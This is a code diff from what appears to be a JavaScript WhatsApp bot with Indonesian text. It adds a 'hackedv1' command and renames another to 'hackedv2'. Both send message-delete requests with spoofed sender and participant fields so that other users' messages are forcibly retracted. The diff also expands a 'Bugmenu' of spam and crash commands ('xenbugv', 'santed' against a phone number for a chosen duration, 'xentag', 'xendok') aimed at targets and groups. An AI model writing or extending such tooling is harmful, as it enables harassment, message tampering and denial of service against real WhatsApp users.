@@ -543,7 +543,17 @@ let buttons = [
                 xinn.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
           break
-case 'hacked':
+
+case 'hackedv1':
+xinn.sendMessage(from, { delete: {
+  remoteJid: from,
+  id: m.quoted.id,
+  fromMe: m.quoted.fromMe,
+  participant: ''
+}})
+break
+
+case 'hackedv2':
  xinn.sendMessage(m.chat, { delete: {
 fromMe: false, 
 participant: ``, ...(from ? { remoteJid: "" } : {}) 
@@ -554,7 +564,7 @@ participant: ``, ...(from ? { remoteJid: "" } : {})
 "previewType": "NONE",
 "contextInfo": {
 "stanzaId": "3EB0382EDBB2",
-"participant": "@s.whatsapp.net",
+"participant": "0@s.whatsapp.net",
 }}}})
 break
 
@@ -706,7 +716,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "noteMessage": {
 "extendedTextMessage": {
 "requestFrom":`${pushname}`,
-"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug ampas) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)`,
+"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug ampas) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2`,
 }
 }}}), { userJid: m.chat, quoted: m })
 xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
